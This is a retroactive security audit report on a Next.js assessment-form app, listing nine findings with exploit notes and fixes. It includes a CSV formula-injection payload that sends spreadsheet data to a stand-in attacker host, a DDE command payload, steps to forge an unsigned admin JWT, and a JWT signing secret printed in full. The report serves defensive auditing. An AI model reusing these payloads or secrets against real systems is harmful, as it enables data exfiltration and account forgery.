# Security Report — Express: assessmentform-express-spa-multi-step-as

**Mode:** retroactive
**Audited:** 2026-08-11
**Verdict:** OPEN_THREATS
**Confirmed HIGH/CRITICAL:** 6

---

## Summary

Audited the full implementation of the Multi-Step Assessment Form SPA (Next.js 16 + PostgreSQL + Drizzle ORM), covering 14 API route handlers, 7 auth/middleware files, 10 service/DB-layer files, schema and migrations, and client-side auth guards. The codebase has solid foundations: Drizzle ORM with parameterized queries throughout (no raw SQL injection), Zod body validation on all mutation routes, and a dual-layer ownership check (middleware + service layer) on respondent endpoints. However, six confirmed HIGH or CRITICAL issues were found that require remediation before production: (1) production database credentials and the JWT secret are committed to git in `.env.local`; (2) the `/api/notifications/email` endpoint is publicly callable with no authentication, enabling email-relay abuse; (3) JWT algorithm is not pinned in two of three `jwtVerify` call sites, leaving an algorithm-confusion vector; (4) no rate limiting exists on `/api/auth/login` or `/api/sessions`, enabling brute-force and session-flooding; (5) CSV export does not neutralize formula-injection prefixes in free-text answers; (6) `NODE_TLS_REJECT_UNAUTHORIZED=0` is exported in `scripts/start.sh`, disabling TLS verification for all outbound connections at runtime. Additionally, three MEDIUM findings are noted. **No-ship in current state** — at minimum the committed secrets must be rotated and the email notification endpoint must be gated before deployment to production.

---

## Attack surface audited

| Area | STRIDE | Verdict | Evidence (file:line) |
|------|--------|---------|----------------------|
| POST /api/auth/login — email-only SO login, issues 8h JWT | Spoofing, DoS | CONFIRMED — no rate limiting | `src/app/api/auth/login/route.ts:14` |
| POST /api/sessions — respondent session create/resume | DoS, Spoofing | CONFIRMED — no rate limiting | `src/app/api/sessions/route.ts:32` |
| GET /api/sessions/:sessionId — session resume with ownership check | IDOR | REFUTED — dual check (requireSessionOwner + service layer) | `src/app/api/sessions/[sessionId]/route.ts:42`, `src/lib/session/sessionService.ts:201` |
| PUT /api/responses/:sessionId — auto-save with Zod validation | Tampering | REFUTED — assessmentOpenGuard + requireSessionOwner + Zod | `src/app/api/responses/[sessionId]/route.ts:36–66` |
| POST /api/submissions/:sessionId — finalize submission | Tampering, EoP | REFUTED — requireSessionOwner blocks SO, assessmentOpenGuard enforces due date | `src/app/api/submissions/[sessionId]/route.ts:35–42` |
| GET /api/sections + GET /api/sections/:sectionId/questions | Information Disclosure | REFUTED — jwtMiddleware gates both; section content is non-sensitive | `src/app/api/sections/route.ts:46`, `src/app/api/sections/[sectionId]/questions/route.ts:47` |
| GET/PATCH /api/config — config read/write | EoP, Tampering | REFUTED — requireSystemOwner enforced | `src/app/api/config/route.ts:9,34` |
| GET /api/dashboard/** (responses, analytics, CSV) | EoP, Information Disclosure | REFUTED — requireSystemOwner enforced on all routes | `src/app/api/dashboard/responses/route.ts:8`, `analytics/route.ts:8`, `export/csv/route.ts:9`, `responses/[sessionId]/route.ts:11` |
| POST /api/notifications/email — email relay trigger | EoP, DoS, Spoofing | CONFIRMED — no auth at all | `src/app/api/notifications/email/route.ts:25` |
| GET /api/health — DB connectivity probe | Information Disclosure | LOW — unauthenticated by design; leaks DB connection status | `src/app/api/health/route.ts:9` |
| JWT signing/verification — HS256, jose library | Spoofing | CONFIRMED — algorithm not pinned in 2 of 3 jwtVerify call sites | `src/lib/middleware/requireSessionOwner.ts:54`, `src/app/api/config/route.ts:61` |
| .env.local committed to git — DB URL + JWT secret | Information Disclosure | CONFIRMED CRITICAL — real credentials in repo history | `d8ad63a` commit, `.env.local`, `.env.local.QUARANTINED-INCIDENT-20260722` |
| CSV export — free-text answers embedded in CSV | Tampering | CONFIRMED — no formula-injection prefix neutralization | `src/lib/services/csvExportService.ts:13–34` |
| dashboardService.ts — sortBy/sortDir parameters | Tampering (SQL injection) | REFUTED — allowlist map lookup, Drizzle ORM column reference | `src/lib/services/dashboardService.ts:59–67` |
| dashboardService.ts — ilike search parameter | Tampering (SQL injection) | REFUTED — Drizzle ilike() parameterized; `%` wildcards expand but cannot inject SQL | `src/lib/services/dashboardService.ts:50–51` |
| TLS verification — db.ts, drizzle.config.ts | Tampering | CONFIRMED MEDIUM — `rejectUnauthorized: false` in non-local mode | `src/lib/db.ts:24`, `drizzle.config.ts:13` |
| NODE_TLS_REJECT_UNAUTHORIZED=0 in start.sh | Tampering | CONFIRMED HIGH — process-wide TLS disabled at runtime | `scripts/start.sh:7` |
| JWT weak default in start.sh fallback | Spoofing | CONFIRMED MEDIUM — `uat-dev-secret-minimum-32-chars-here!!` used as fallback | `scripts/start.sh:18` |
| XSS — user-controlled free-text rendered in React | Tampering | REFUTED — React auto-escapes text; no `dangerouslySetInnerHTML` found | N/A |
| Client-side auth guard (dashboard AuthGuard.tsx) | Spoofing | REFUTED — client guard is UX-only; all dashboard APIs require server-side JWT | `src/components/dashboard/AuthGuard.tsx:29` (comment notes this explicitly) |
| assessmentOpenGuard fail-open on DB error | Tampering | LOW — guard catches exceptions and returns `{ ok: true }`, allowing saves during DB errors | `src/lib/middleware/assessmentOpenGuard.ts:48–51` |
| section_ids_ordered — attacker-controlled JSONB used in `ANY()` | Tampering | REFUTED — value comes from DB row (sessions.section_ids_ordered), not directly from request | `src/lib/services/dashboardService.ts:130`, `src/lib/services/analyticsService.ts:103` |
| current_section_index — unbounded integer write | Tampering | LOW — validated `min(0)` by Zod, no max; DB column is integer so DB rejects overflow | `src/lib/schemas/answerPayload.ts:68` |

---

## Confirmed findings

### F-01: Production Secrets Committed to Git — CRITICAL
- **Category:** secret_leak / information_disclosure
- **Location:** `.env.local` (committed in commit `d8ad63a`), `.env.local.QUARANTINED-INCIDENT-20260722`
- **Description:** The `.env.local` file containing the production PostgreSQL connection string (with username and password URL-encoded) and the JWT signing secret `q8Fv3nT6ZpW1YxRk9LmC2aD5sH7uQ4Jb0VgEoI+NtUf=` was committed to the git repository in commit `d8ad63a`. The file is **not** in `.gitignore` (`.gitignore` only ignores `.venv/` and `venv/`; it does not include `.env.local`). The quarantine copy confirms this is a known incident (file renamed with `QUARANTINED-INCIDENT-20260722` suffix) but the credential-containing files remain in git history and on disk.
- **Exploit:** Anyone with read access to the git repository can extract the production DB password and JWT secret with `git show d8ad63a -- .env.local`. The DB password grants direct read/write to all respondent data. The JWT secret allows minting arbitrary tokens for any role (including `system_owner`) that will be accepted by all API endpoints.
- **Fix:** (1) Rotate DB password and JWT secret immediately. (2) Purge the file from git history using `git filter-repo` or BFG. (3) Add `.env.local` and `.env*.local` patterns to `.gitignore`. (4) Verify the DB credentials in the quarantined file are no longer valid.

---

### F-02: Unauthenticated /api/notifications/email Endpoint — HIGH
- **Category:** authz_bypass / spoofing / dos
- **Location:** `src/app/api/notifications/email/route.ts:25`
- **Description:** The `POST /api/notifications/email` endpoint is documented as "internal server-to-server only" but has **no authentication whatsoever**. Any unauthenticated HTTP client can call it with a valid-looking JSON body `{ session_id, email, name, due_date }` and trigger outbound email relay requests. The endpoint accepts any valid `email` string in the body — the `email` field is validated only as a string.email format, not checked against any session or ownership.
- **Exploit:** An attacker sends: `POST /api/notifications/email` with body `{"session_id":"00000000-0000-0000-0000-000000000000","email":"victim@example.com","name":"Winner","due_date":"2026-12-31T00:00:00Z"}`. The server calls `sendSubmissionConfirmation()` which POSTs to `EMAIL_RELAY_URL` with the attacker-controlled `email` and `name`. This enables: (a) email spam/phishing to any address by looping through an email list; (b) SSRF if the attacker can influence the `EMAIL_RELAY_URL` via env manipulation; (c) DoS on the email relay by flooding requests.
- **Fix:** (a) Short-term: add a shared secret header check (e.g. `X-Internal-Secret`) verified against an env var, or only call the email service directly (not via HTTP) since `submissionService.ts` already calls `sendSubmissionConfirmation` directly without going through the HTTP route. (b) Remove the HTTP endpoint entirely and rely only on the direct function call already present in `src/app/api/submissions/[sessionId]/route.ts:58`.

---

### F-03: JWT Algorithm Not Pinned in Two jwtVerify Call Sites — HIGH
- **Category:** spoofing / auth_bypass
- **Location:** `src/lib/middleware/requireSessionOwner.ts:54`, `src/app/api/config/route.ts:61`
- **Description:** `verifyJwt()` in `authService.ts` correctly pins `{ algorithms: ['HS256'] }` (line 31). However, there are two additional raw `jwtVerify` calls that **do not** specify the `algorithms` option:
  - `requireSessionOwner.ts:54`: `await jwtVerify(token, secret)` — used for `PUT /api/responses/:sessionId` and `POST /api/submissions/:sessionId`
  - `config/route.ts:61`: `await jwtVerify(token, secret)` — used for the belt-and-suspenders email extraction in `PATCH /api/config`
  With `jose`, omitting `algorithms` means the library uses any algorithm the JWT header claims. If an attacker crafts a JWT with `alg: "none"` and a specially formed signature, or if a future `jose` version changes defaults, these endpoints could accept tokens without signature verification.
- **Exploit:** Craft a JWT with header `{"alg":"none","typ":"JWT"}`, payload `{"email":"attacker@x.com","role":"system_owner"}`, and empty signature. Send to `PUT /api/responses/<any-session-id>`. The `requireSessionOwner.ts` middleware would accept the unsigned token (depending on jose version behavior with `alg:none`). Note: current jose versions may reject `none` by default, but the missing pin is still a structural vulnerability if the library's default behavior changes or is misconfigured.
- **Fix:** Add `{ algorithms: ['HS256'] }` to both raw `jwtVerify` calls at `requireSessionOwner.ts:54` and `config/route.ts:61`. Better yet, route all JWT verification through the central `verifyJwt()` function in `authService.ts`.

---

### F-04: No Rate Limiting on /api/auth/login and /api/sessions — HIGH
- **Category:** dos / brute_force
- **Location:** `src/app/api/auth/login/route.ts:14`, `src/app/api/sessions/route.ts:32`
- **Description:** Neither `POST /api/auth/login` (System Owner login) nor `POST /api/sessions` (respondent session creation) have any rate limiting, throttling, or CAPTCHA. The login endpoint performs a DB lookup for every request; the sessions endpoint does a DB lookup plus potential INSERT.
- **Exploit (login):** An attacker scripts `POST /api/auth/login` with rotating emails to enumerate which emails are registered as System Owners (the error distinguishes `NOT_A_SYSTEM_OWNER` from auth success), then brute-forces the token if the JWT is email-only without a password. Since login requires only an email (magic-link style), a legitimate SO account can be taken over if the attacker knows the email, since the JWT is issued immediately on matching an active record — no password or TOTP required.
- **Exploit (sessions):** An attacker can create unlimited sessions/respondent accounts, flooding the `respondents` and `sessions` tables without any barrier (only a DB UNIQUE constraint on email, but with rotating emails this is trivially bypassed).
- **Fix:** Add IP-based rate limiting (e.g., `next-rate-limit`, Vercel Edge Middleware, or a reverse proxy rule): max 5 login attempts per IP per 15 minutes; max 10 session creates per IP per hour. Also consider exponential backoff and account lockout after repeated failures on `/api/auth/login`.

---

### F-05: CSV Formula Injection in Export — HIGH
- **Category:** csv_injection / tampering
- **Location:** `src/lib/services/csvExportService.ts:13–34` (`flattenAnswerPayload`)
- **Description:** The CSV export renders free-text answers (`free_text_short`, `free_text_long`) verbatim via `String(p.value ?? '')` with no sanitization of formula injection prefixes. If a respondent submits an answer beginning with `=`, `+`, `-`, or `@`, spreadsheet applications (Excel, LibreOffice, Google Sheets) will interpret it as a formula when the CSV is opened. Although `csv-stringify` properly quotes fields containing commas and quotes, it does **not** prefix-neutralize formula characters.
- **Exploit:** A respondent submits a free-text answer: `=HYPERLINK("https://evil.example.com/steal?data="&A2,"Click here")`. When a System Owner opens the exported CSV in Excel, this formula executes, exfiltrating spreadsheet data to the attacker-controlled server. Variants include `=CMD|' /C calc'!A0` (DDE injection on older Excel versions).
- **Fix:** In `flattenAnswerPayload()`, for `free_text_short` and `free_text_long` cases, prefix-escape values that start with `=`, `+`, `-`, `@`, `\t`, or `\r` by prepending a single quote (`'`) or tab-character. Example: `const safe = /^[=+\-@\t\r]/.test(val) ? "'" + val : val`.

---

### F-06: NODE_TLS_REJECT_UNAUTHORIZED=0 Exported in Production Start Script — HIGH
- **Category:** tampering / information_disclosure
- **Location:** `scripts/start.sh:7`
- **Description:** The production startup script exports `NODE_TLS_REJECT_UNAUTHORIZED=0` as a **process-wide environment variable** before starting the Next.js server. This disables TLS certificate verification for **all** outbound HTTPS connections from the Node.js process, including connections to external services (email relay, any future third-party integrations). This is broader in scope than the scoped `rejectUnauthorized: false` in `db.ts` (which only affects the DB pool).
- **Exploit:** A man-in-the-middle attacker on the network between the server and `EMAIL_RELAY_URL` (or any other HTTPS endpoint) can present a self-signed or invalid certificate and intercept all traffic — including email content containing respondent names, emails, and session IDs — without detection.
- **Fix:** Remove `export NODE_TLS_REJECT_UNAUTHORIZED=0` from `scripts/start.sh`. If the database sidecar requires a self-signed cert, scope the TLS bypass to the DB connection only (already done in `db.ts`) rather than applying it process-wide. Configure `EMAIL_RELAY_URL` with a properly CA-signed certificate.

---

## Medium / Lower Severity Findings

### F-07: Weak JWT Fallback Secret in start.sh — MEDIUM
- **Category:** secret_leak / weak_secret
- **Location:** `scripts/start.sh:18`
- **Description:** When `JWT_SECRET` is not found in PID1 env, the script falls back to the hardcoded value `uat-dev-secret-minimum-32-chars-here!!`. If the platform fails to inject `JWT_SECRET` (e.g., due to misconfiguration), the app silently starts with this well-known secret visible in the public repository. Any attacker who reads the start script can forge valid JWTs for any role.
- **Fix:** Remove the fallback value. Instead, fail fast: `JWT="${JWT:-${JWT_SECRET:?JWT_SECRET is required}}"` — this causes the script to exit with an error rather than silently starting with a weak secret.

---

### F-08: TLS Certificate Verification Disabled for DB and Config Tool — MEDIUM
- **Category:** tampering / information_disclosure
- **Location:** `src/lib/db.ts:24`, `drizzle.config.ts:13`
- **Description:** Both the runtime DB pool and the Drizzle migration tool use `ssl: { rejectUnauthorized: false }` for non-local connections. While this is scoped to DB connections only (unlike F-06 which is process-wide), it allows MITM attacks on the database wire protocol, potentially exposing all respondent data and credentials.
- **Fix:** Provision a valid CA certificate for the database sidecar and set `ssl: { rejectUnauthorized: true, ca: fs.readFileSync('/path/to/ca.pem') }`, or use `sslmode=verify-full` in the connection string.

---

### F-09: assessmentOpenGuard Fails Open on DB Error — LOW
- **Category:** tampering / guard_bypass
- **Location:** `src/lib/middleware/assessmentOpenGuard.ts:48–51`
- **Description:** The `assessmentOpenGuard` catches all exceptions and returns `{ ok: true }` (treating the assessment as open). If the `assessment_config` table is temporarily unavailable or the query times out, the guard silently permits saves and submissions even if the assessment is closed. This could allow post-deadline submissions during a DB outage window.
- **Fix:** Consider failing closed (return `ASSESSMENT_CLOSED`) when the config cannot be read, unless the intended design is to allow saves during DB hiccups. At minimum, log a warning with the error so operators know the guard was bypassed.

---

## Accepted risks

| ID | Risk | Why accepted | Owner |
|----|------|--------------|-------|
| R-01 | `/api/health` leaks DB connectivity status (connected/disconnected) to unauthenticated callers | Required for container healthchecks and monitoring; status leaks are operationally necessary. Impact is low — no sensitive data exposed. | Infra / Ops |
| R-02 | `current_section_index` has no upper-bound validation at API layer (only `min(0)`) | Upper bound is implicitly enforced by the DB integer column type (max 2,147,483,647); no known exploit path — the value is informational only and triggers no conditional logic that could be abused. | Dev team |
| R-03 | `ilike` wildcard search (`%term%`) in dashboard/CSV allows potentially slow queries on large datasets | An authenticated System Owner is the only caller. Mitigated by `pageSize` cap of 100. True DoS would require SO credentials. | Dev team |

---

## Audit trail
- **Diff scoped via:** entire develop branch implementation files (all files listed in required reading; no main branch exists)
- **Register:** built retroactively from implementation diff (retroactive STRIDE mode)
- **Refutation:** 23 candidates examined, 9 confirmed (6 HIGH/CRITICAL + 3 MEDIUM/LOW), 14 refuted as safe
- **Key safe findings refuted:** SQL injection via sortBy (allowlist map, no raw string interpolation); SQL injection via search (Drizzle ilike() parameterized); IDOR on session endpoints (dual-layer ownership check confirmed in both middleware and service layer); XSS via free-text (React JSX auto-escaping, no dangerouslySetInnerHTML); CSV sort/filter injection (Drizzle column references, not string interpolation)
